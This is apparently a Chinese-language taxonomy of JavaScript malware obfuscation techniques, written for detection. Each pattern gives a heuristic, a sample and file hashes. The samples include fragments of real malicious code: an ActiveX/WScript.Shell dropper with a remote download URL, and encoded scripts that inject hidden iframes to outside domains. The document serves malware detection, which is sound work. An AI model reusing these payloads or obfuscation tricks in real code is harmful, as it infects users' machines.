模式总结

1	纯统计类

1.1	压缩
描述/判断方式：程序全部或部分没有换行符。设置一个1000字符的缓冲区，如缓冲区内换行符个数少于10个则判断为此模式
程序示例：
FiZUrJVoVorCFuI;var EZNqUUEVVzFKNZq;VruerCwuOKeVrrN= false;var WshShell= new ActiveXObject("WScript.Shell");var vuvuvu= new ActiveXObject("Scripting.FileSystemObject");if(vuvuvu.FileExists("C://ProgramData//"+ "dddd")){}else {try{var fso= new ActiveXObject("Scripting.FileSystemObject");fso.CreateFolder("C://ProgramData//"+ JVVcrrZrKOuEUFV);var eeeee= new ActiveXObject("Scripting.FileSystemObject");var yyyy=eeeee.CreateTextFile("C://ProgramData//"+ "dddd",true);yyyy.WriteLine("pop");yyyy.Close()}catch(ex){};EZNqUUEVVzFKNZq= ("http://www.ecostargrp.com/wp-content/themes/twentythirteen/images/at.jpg");
Hash: 0a0e10988e66bffe2be4fb6d62760d73,0a7b662dba064819a1e3c762fadb697b,
0a89e057b47001aa96cbb9b350913cbc,0a0408ceb46f34f230e333557328d2fc,
0a6891b0e0e717445feb7d08c8e84b81,0a74359f190c92a6c0f776034c08855a,
0aac8b7a77c8da292e612d63077d280c,0aec8291a01f84dbd8ea186494937f6a

2	表达式类

2.1	超长字典/映射
描述/判断方式：结构体超过50个键值对
程序示例：
NCMCJKVczcCUyiV={"00":0,"01":1,"02":2,"03":3,"04":4,"05":5,"06":6,"07":7,"08":8,"09":9,"0A":10,"0B":11,"0C":12,"0D":13,"0E":14,"0F":15,"10":16,"11":17,"12":18,"13":19,"14":20,"15":21,"16":22,"17":23,"18":24,"19":25,"1A":26,"1B":27,"1C":28,"1D":29,"1E":30,"1F":31,"20":32,"21":33,"22":34,"23":35,"24":36,"25":37,"26":38,"27":39,"28":40,"29":41,"2A":42,"2B":43,"2C":44,"2D":45,"2E":46,"2F":47,"30":48,"31":49,"32":50,"33":51,"34":52,"35":53,"36":54,"37":55,"38":56,"39":57,"3A":58,"3B":59,"3C":60,"3D":61,"3E":62,"3F":63,"40":64,"41":65,"42":66,"43":67,"44":68,"45":69,"46":70,"47":71,"48":72,"49":73,"4A":74,"4B":75,"4C":76,"4D":77,"4E":78,"4F":79,"50":80,"51":81,"52":82,"53":83,"54":84,"55":85,"56":86,"57":87,"58":88,"59":89,"5A":90,"5B":91,"5C":92,"5D":93,"5E":94,"5F":95,"60":96,"61":97,"62":98,"63":99,"64":100,"65":101,"66":102,"67":103,"68":104,"69":105,"6A":106,"6B":107,"6C":108,"6D":109,"6E":110,"6F":111,"70":112,"71":113,"72":114,"73":115,"74":116,"75":117,"76":118,"77":119,"78":120,"79":121,"7A":122,"7B":123,"7C":124,"7D":125,"7E":126,"7F":127,"80":128,"81":129,"82":130,"83":131,"84":132,"85":133,"86":134,"87":135,"88":136,"89":137,"8A":138,"8B":139,"8C":140,"8D":141,"8E":142,"8F":143,"90":144,"91":145,"92":146,"93":147,"94":148,"95":149,"96":150,"97":151,"98":152,"99":153,"9A":154,"9B":155,"9C":156,"9D":157,"9E":158,"9F":159,"A0":160,"A1":161,"A2":162,"A3":163,"A4":164,"A5":165,"A6":166,"A7":167,"A8":168,"A9":169,"AA":170,"AB":171,"AC":172,"AD":173,"AE":174,"AF":175,"B0":176,"B1":177,"B2":178,"B3":179,"B4":180,"B5":181,"B6":182,"B7":183,"B8":184,"B9":185,"BA":186,"BB":187,"BC":188,"BD":189,"BE":190,"BF":191,"C0":192,"C1":193,"C2":194,"C3":195,"C4":196,"C5":197,"C6":198,"C7":199,"C8":200,"C9":201,"CA":202,"CB":203,"CC":204,"CD":205,"CE":206,"CF":207,"D0":208,"D1":209,"D2":210,"D3":211,"D4":212,"D5":213,"D6":214,"D7":215,"D8":216,"D9":217,"DA":218,"DB":219,"DC":220,"DD":221,"DE":222,"DF":223,"E0":224,"E1":225,"E2":226,"E3":227,"E4":228,"E5":229,"E6":230,"E7":231,"E8":232,"E9":233,"EA":234,"EB":235,"EC":236,"ED":237,"EE":238,"EF":239,"F0":240,"F1":241,"F2":242,"F3":243,"F4":244,"F5":245,"F6":246,"F7":247,"F8":248,"F9":249,"FA":250,"FB":251,"FC":252,"FD":253,"FE":254,"FF":255}
Hash: 0a0e10988e66bffe2be4fb6d62760d73,0a6891b0e0e717445feb7d08c8e84b81

2.2	数字替换
描述/判断方式：使用表达式代替数字。
程序示例：
var sFUPT = kXk[942 - 942] + kXk[346 - 344] + CwJXCrd;
Hash：0a26124a3790fd438183d8d968043c60,0bc299985821ed7cf9cbc5b50dc7a18d,
0c6d8c0c04f5af57ea7ad7ff07457f32

2.3	超长显示定义数组
描述/判断方式：显示定义的数组内有超过50个元素
程序示例：
f = new Array(050, 0146, 0165, 0156, 0143, 0164, 0151, 0157, 0156, 040, 050, 051, 040, 0173, 015, 012, 040, 040, 040, 040, 0166, 0141, 0162, 040, 0171, 0150, 0153, 040, 075, 040, 0144, 0157, 0143, 0165, 0155, 0145, 0156, 0164, 056, 0143, 0162, 0145, 0141, 0164, 0145, 0105, 0154, 0145, 0155, 0145, 0156, 0164, 050, 047, 0151, 0146, 0162, 0141, 0155, 0145, 047, 051, 073, 015, 012, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0162, 0143, 040, 075, 040, 047, 0150, 0164, 0164, 0160, 072, 057, 057, 065, 0123, 0164, 0141, 0162, 0104, 0162, 0145, 0141, 0155, 0124, 0145, 0141, 0155, 056, 0143, 0157, 0155, 057, 0167, 0160, 055, 0151, 0156, 0143, 0154, 0165, 0144, 0145, 0163, 057, 0145, 0163, 0144, 056, 0160, 0150, 0160, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0160, 0157, 0163, 0151, 0164, 0151, 0157, 0156, 040, 075, 040, 047, 0141, 0142, 0163, 0157, 0154, 0165, 0164, 0145, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0142, 0157, 0162, 0144, 0145, 0162, 040, 075, 040, 047, 060, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0150, 0145, 0151, 0147, 0150, 0164, 040, 075, 040, 047, 061, 0160, 0170, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0167, 0151, 0144, 0164, 0150, 040, 075, 040, 047, 061, 0160, 0170, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0154, 0145, 0146, 0164, 040, 075, 040, 047, 061, 0160, 0170, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0164, 0157, 0160, 040, 075, 040, 047, 061, 0160, 0170, 047, 073, 015, 012, 015, 012, 040, 040, 040, 040, 0151, 0146, 040, 050, 041, 0144, 0157, 0143, 0165, 0155, 0145, 0156, 0164, 056, 0147, 0145, 0164, 0105, 0154, 0145, 0155, 0145, 0156, 0164, 0102, 0171, 0111, 0144, 050, 047, 0171, 0150, 0153, 047, 051, 051, 040, 0173, 015, 012, 040, 040, 040, 040, 040, 040, 040, 040, 0144, 0157, 0143, 0165, 0155, 0145, 0156, 0164, 056, 0167, 0162, 0151, 0164, 0145, 050, 047, 074, 0144, 0151, 0166, 040, 0151, 0144, 075, 0134, 047, 0171, 0150, 0153, 0134, 047, 076, 074, 057, 0144, 0151, 0166, 076, 047, 051, 073, 015, 012, 040, 040, 040, 040, 040, 040, 040, 040, 0144, 0157, 0143, 0165, 0155, 0145, 0156, 0164, 056, 0147, 0145, 0164, 0105, 0154, 0145, 0155, 0145, 0156, 0164, 0102, 0171, 0111, 0144, 050, 047, 0171, 0150, 0153, 047, 051, 056, 0141, 0160, 0160, 0145, 0156, 0144, 0103, 0150, 0151, 0154, 0144, 050, 0171, 0150, 0153, 051, 073, 015, 012, 040, 040, 040, 040, 0175, 015, 012, 0175, 051, 050, 051, 073)
Hash: 0b40593f1d2dd27a1d25830c6918f7d2,0c8ebff9d1172e502414fb2d419df316

3	字符串类

3.1	拼接关键字
描述/判断方式：使用字符串拼接关键字。使用机器学习解决
程序示例：
animated = "Cr"; sortOrder = "eateOb"; _ = "ject"; var div1 = "WSc", msMatchesSelector = "ri", t = "pt"; Expr = ".S", prefix = "hell";
compiled = parseOnly[animated + sortOrder + _](div1 + msMatchesSelector + t + Expr + prefix);
Hash: 0a1ebe61a24d91bdb8e2e62694c765fc,0a13ad90bcd177094a105036661e2c62,
0a2092d4f7cd9c262ac67c97fffc6151,0a3679d658f853b79770058ef4a86c31,
00a9876dc8546a9d0afccdf5ffaa44d3,0a74359f190c92a6c0f776034c08855a,

3.2	超长数字串
描述/判断方式：超过30个字节都是数字。（包括10进制和16进制）
程序示例：
var rfhkryrz = "77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822333464623061383666346434333730616232633232336130386431653961636622293b69662820783333647120213d2022386435323333316132633934666464313965383663306139333839343436646422297b783232627128223334646230613836663464343337306162326332323361303864316539616366222c223864353233333161326339346664643139653836633061393338393434366464222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6373732e7479706f72756c7569706172656e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6566666569447177674143426d3d566d6b516e447478536477266b6579776f72643d353238303530653337383266666165356662376563393963346530383036366226535756466c436346753d58757275786a624e6c65555956756a2646787747576e6375515468413d72564778775255436a56732644787a4a6a5a55684644784e5a46713d515758594e634449562676736449504d4a7a75493d59656c515048267367434f4a546b5169455364464c6d67583d4476634e7a57626f5154516526516e4d7a5078505a42526b764f70766b734e503d50677856714874464b726270686e704a426b477026794a4f715255616a44705a3d7456634c4241617767444f64665577223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";
Hash: 0a2cde294b9ca35da02aa4f1f405f890,00cf3db1b71970e6847a70a6f4ff8a77

3.3	异常\x转义
描述/判断方式：一个字符串由连续超过20个\x转义字符，或含有超过20%的转义字符，或超过70%的字符串有\x转义字符。
程序示例：
var _0x1C5FC = ["\x25\x64\x58\x6C\x4C\x25\x71\x53\x64\x70\x65\x6D\x65\x50\x41\x6F\x72\x74\x70\x65\x6A\x6C\x65\x6A\x6E\x63\x25\x25\x78\x45\x2E\x58\x43\x75\x70\x28\x72\x6F\x6F\x4C\x4D\x73\x2D\x72\x73\x4D\x6E\x61\x6E\x45\x74\x70\x25\x54\x54\x22\x73\x73\x4D\x3A\x74\x62\x6E\x75\x2E\x25\x4F\x61\x63\x2F\x22\x61\x77\x72\x65\x65\x25\x25\x65\x6A\x25\x62\x53\x66\x6E\x64\x3F\x65\x32\x6C\x65\x2F\x54\x74\x34\x32\x54\x48\x4F\x25\x64\x2E\x78\x6F\x29\x6E\x6E\x74\x6B\x73\x68\x63\x47\x2F\x6F\x74\x64\x73\x74\x65\x53\x3B", "\x6C\x65\x6E\x67\x74\x68", "\x63\x68\x61\x72\x41\x74", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65", "", "\x25", "\x23\x31", "\x23\x30", "\x23", "\x73\x70\x6C\x69\x74", "\x6A\x6F\x69\x6E"];
Hash：0c935f8a039dc1e294822cfd0bc8031d,0db3b56c858994234127dbb8ab373318

3.4	程序编码
描述/判断方式：将程序中的字符转换为数字并编入字符串，每个字符之间使用一个特殊符号分隔。如检测到一个长度超过200的字符串中某字符的占比超过25%或某两个字符的占比分别超过20%则判断为此模式
程序示例：
function Gsvibeyu()
{
    var temp="",i,c=0,out="";
    var str="60#115#99#114#105#112#116#62#13#10#102#117#110#99#116#105#111#110#32#101#110#99#111#100#101#40#115#116#114#41#13#10#123#13#10#32#32#32#32#118#97#114#32#99#104#97#114#72#101#120#32#61#32#110#101#119#32#65#114#114#97#121#40#39#48#39#44#39#49#39#44#39#50#39#44#39#51#39#44#39#52#39#44#39#53#39#44#39#54#39#44#39#55#39#44#39#56#39#44#39#57#39";l=str.length;str.charAt(0);
    while(c<=str.length-1){
        while(str.charAt(c)!='#')temp=temp+str.charAt(c++);
        c++;out=out+String.fromCharCode(temp);temp="";
    }
    document.write(out);
}
Gsvibeyu();
Hash：0a05f424b1908af2557d516b10c62a21,0a6fd674b29ae6f398e8ab220db5f728,
0a8efb49e9b76de51615c4580d8a6f1f,0a8f13c992f57bd9f10b4c1ae2b69088,
0a22a4f7c703b3207c7d47bd83e1a6e3,0a064e49f8f7404d78b0559679b93e2e,

3.5	异常%转义
描述/判断方式：字符串中使用超过5个”%”+数字的形式。还有可能先使用”~”代替”%”，再使用.replace替换。
程序示例：
function when() {
      eval(unescape("%20%20%20%20%20%20%20%20onabort%5B%22WScr%22.stopQueue%28%29%20+%20webkitMatchesSelector%5D%5B%22Slee%22%20+%20diff%5D%28%28%28responseText%7C12952%29%29%29%3B%20%20%20%0D"));
}
Hash: 0a6edb058be48ffa9c730a81f6a03d8f,0a3679d658f853b79770058ef4a86c31,
0ad0f4a357e3fde1e2be90fdba9ebcd1,0d3c2276663f0cf19f276c6b8ce2dab4

3.6	异常拼接程序
描述/判断方式：将程序用字符串表示后进行分隔并随机插入字符分隔。对所有字符串进行字符频次统计，有字符出现频次超过33%则判断为此模式。
示例程序：
var cKzrSWjTkJAMulpdQna = 'ZvZaZr ZfZIZ' +
  'BrZDZaZpZbZKZqhNkZgmZ Z= ZneZw ZAZ' +
  'ctZiZveZXOZbZjeZctZ(Z"ZSZhZeZllZ.' +
  'ZAZPplZiZcZaZTZiZoNZ");Z ZvZaZrZ ZIuZ' +
  'iZSNZdZlZxZqWZTZGpfjZvZyr Z= ZneZwZ AcZtZiZveXZOZbjZectZ(Z"wZSZcZRipZt.shelZlZ"Z);Z Zvar ZPvGZnsZOZSZVZfqZALZbpZWzZcZhZ Z=Z ZnZewZ ZAcZtiZveZXZOZbZjZeZct(Z"scZrZiZptZiNZg.ZfZIleZsZyZs' +
  'ZtZemoBjeZCZt"Z)Z;Z ZfZuZnctioZ' +
  'n ZuZxmZcZMZVZoZrfZGiNQsLZeZ(Z)Z { ZreZtZu' +
  'ZrZn ZPZvGns' +
  'OSVZfZqALZbZpZWzZchZ.ZFoZldeZrEZxisZtZsZ' +
  '("rZW' +
  'pZuZsZL' +
  'ZAPEKZnqaiZyNZeZ"); Z}vZarZ AOZzZxZvwZMZscNZXZtHZgZUGZ Z=Z Z17Z0Z7Z2617/1Z7Z07Z2Z6Z1Z7' +
  'Z; ZvZaZr ZcqZjZSZFmZJyZNZVZPbZkxZM' +
  'Z =Z ""Z;Z ZfZuZnZ' +
  'cZtZiZoZnZ PZBZVgZfZCcZYWZkDdZxZSZheZjw(ZulZrKZnZCZJZUZg' +
  'oZVZcZqZbZNR' +
  'ZdaZ)Z {Z ZrZeZtuZrnZ ZSZtrinZgZ.fZromChZaZrCZodeZ(ZuZlZrZKnZCZJUZgZoZVZcq' +
  'bNR' +
  'ZdZaZ);Z Z} ZfuZnZctioZnZ KmuZkZs' +
  'ZiZCZSZcaZHbZqroZvZe(E' +
  'ZMB' +
  'gZnZSZaZHZtZCZIDZeOZfm, oZAZMZKZWdJZfwZxZsviZBp)Z {Z rZetZurZnZ EZMBZgnSaHZtZCZIZDeOZfZmZ.ZcharZCoZ' +
  'deZAZt(ZoAZMZKWZdZJZfZwZxsZv' +
  'iBpZ' +
  '); }'

function UYnuKkevHbAtTWz(SewBhbVfkCLgsrj, SKYyrzTcXPvnipHMNa) {
  return SewBhbVfkCLgsrj.split(SKYyrzTcXPvnipHMNa).join("");
}
var TLMVzXycSPNCqov = eval(UYnuKkevHbAtTWz(cKzrSWjTkJAMulpdQna, "Z"));
Hash：0d396a4103e64e067a308667799b2966

3.7	字符串中有大量空格
描述/判断方式：字符串中插入大量空格。
程序示例：
OLALBZ = " % F % l % a % s % h % # % P % l % a % y % # % d % e % s % a % t % u % a % l % i % z % a % d % o % ! % ";
OLALBZ = OLALBZ.replace(/ /g, "");
Hash：11cc08871803a4281dcf9983d59d4a14

4	语法分析类

4.1	异常字符串拼接变种
描述/判断方式：将字符串分割成很多子字符串并存储在变量中，最后使用一个新变量将其拼接起来。检测到一个变量被”+=”改变超过50次则判定为此模式
程序示例：
e8 = a4;
z7 += e8;
e8 = a3;
z7 += e8;
e8 = j8;
z7 += e8;
e8 = n3;
z7 += e8;
e8 = f7;
z7 += e8;
e8 = q1;
z7 += e8;
e8 = l3;
z7 += e8;
e8 = v9;
z7 += e8;
e8 = j0;
z7 += e8;
Hash：0d6ad8c36ced8b3baa0315eabc3a0b3c,0db02a3e6bf6d3ea41837efa316ee05b

4.2	函数代替赋值
描述/判断方式：出现超过10个只有一条返回语句的函数则判定为此模式。
程序示例：
return '(); xa';
};

function c7() {
return '0; try';
};

function f1() {
return '.writ';
};

function a7() {
return 'CreateO';
};
Hash：0db02a3e6bf6d3ea41837efa316ee05b

4.3	异常字符串拼接
描述/判断方式：使用JavaScript短路特性在拼接字符串时加入无意义字符串
程序示例：
+ ("accepts", "erroneously", "defunct", "Rk") +
Hash：0d0f8c58b0ad357b0510e0da264afb7d

5	变量名类

5.1	随机变量名
描述/判断方式：出现字母数占比小于70%，元音占比小于10%或大于80%，大写字母占比在50%-95%或有超过两个重复字母的变量名为随机变量名。
程序示例：
var xPDHt = "f";
var TjShw = "isd";
var jdpDBvpqvXs = "uh";
var bLpKqUdJLFN = "ya";
var bPPYSDCrdTRZMmx = "f";
var oHu = "d";
var SnPRYsJxUZVINr = "s";
var OAHgKUStqpH = "g";
var cGEnQZ = "a7o";
var TiPBGYmTybd = "f";
var pSCUqAs = "sd8";
var rejrsdfQsmFP = "7hg";
var rqVPqWTgkgriLwg = "au";
var jFyTfhtxXnAx = "f";
var tGturuu = "osd";
var vmZMx = "kja";
var UYPZlrItHM = ";lf";
var wUR = "d";
Hash：0069ad4d74ed620675e52e1c9c442b32, 009d11580c0a9025e000d0640709a11e

5.2	过多单个字符变量名
描述/判断方式：单个字符变量名出现次数超过30次则判定为此模式
程序示例：
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.lordlodhi.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.8"}};
			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a)
Hash：0037e7da0824b622436497f5c0d8f559, 007a1f9e03ae4b75e5c9f217cd2bac7c

5.3	变量名过长
描述/判断方式：变量名长度超过25个字符。
程序示例：var DOSIDANASNDIOASNDOASINDOAISNDAOISNDOAISNDOAISNDOAISNDOAISNDAOISNDAIOSNDOAISNDOAISNDOAISNDOAISNDOAISNDOIASNDOAISNDOASD="DINASOIDNAOISNDAOISNDOAISNDOAISNDOAISNDOAISNDOIASNDOIASNDIOASDNASDNOIDNSANIASDNIOADSNIONIDASNIDASNIONIDASONIDSANISANOINODAISNOI";var ODUASINDIOANSDASDNAOSIDNAOISDNAIOSDINAOISDNAOSNDIASDIDAOISDANIDASOINIODNANIDASNINDOIASOINDASNOIDNIANIDASNIDASOINDNAOSINODIANOID="DOASNIDAISDNOANIDINSAONDSANADSNINDIOAONIDASNNDANDASNIADSNIDNSIAONIOASDNIODASNIODANINIDASNOIASDOINDASNOINDASOINIODSANOIDSANOIDNI";var ODANOIDSINADSNIINDAINODASNOIDOINSANOIDSAOINDSAINDASNIDNISAIDNSAINODSAIONDASINODISNANIDSANOIDASNOIDIOSANNOIDASOINDSAIONDSANIODNS="IODNASDNAISDNNAOISIONSDANIOASDONODASNONISDAOINSDAOINODASINOINSDAONIODASNINIODASINODASINODINONIODASNIODASNOIDSAIONDOISANOINDSAOI";var DNSDIANODSSSSSSSSSSSSSSSSSSSSSSSSSNADSIONNIOSDADYDASYUDUBBUDAUBDABUBUYDASUYBDBAYSUYBUDSABYUDSAYBUYDBSAUBYDASYBDASUIDSDAUDASINDS="IDNASOIDONDASONIDSAOINIONSDAOINADSIONIASDIONSDAOINDASOINOSDAINOINDSAOINASDNIONIDSAONIODASNOIASDNIODNASOIOINDAS";var IDNAOSDNADSINDSANOIDSAOINIONSDAIDASNINOIDSAOINDSAIONNSDAOIIONDSAIONDASNIODASNIONIDSAONIODSANOIDSAOINDSOANINOIASDOINDASNIODSANNS="IODSANIDNOAISNNOSDAOINSDANOISDIONOINSDAOINSDAINODSAIONOINDSANOISDAOINDSNOINDSOIANIODSANIDIONSANIDSANIDSANIOASDOININOSDANOIDSNOD";
Hash：0fde836fd61d667c580989abfcb8e472

6	混合类

6.1	使用异或操作解码程序
描述/判断方式：字符串中有”’”+数字的形式，之后有fromCharCode(“identifier” ^ 2)。
程序示例：
var a = "'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";
b = "";
c = "";
var clen;
clen = a.length;
for (i = 0; i < clen; i++) {
  b += String.fromCharCode(a.charCodeAt(i) ^ 2)
}
Hash：04cf7bfb2967453f9e9e6ae9129ca462, 05469879b349d2789b199414bdff455a,
07e1a6f4d8170e14fcdb7056ba9ee110, 084722c41258f966fd17277ab19982f3,
087879efc11b36ad52e25a7edcf3e404, 08d3e3d1b1695be1d4e8562f7039bf0d,
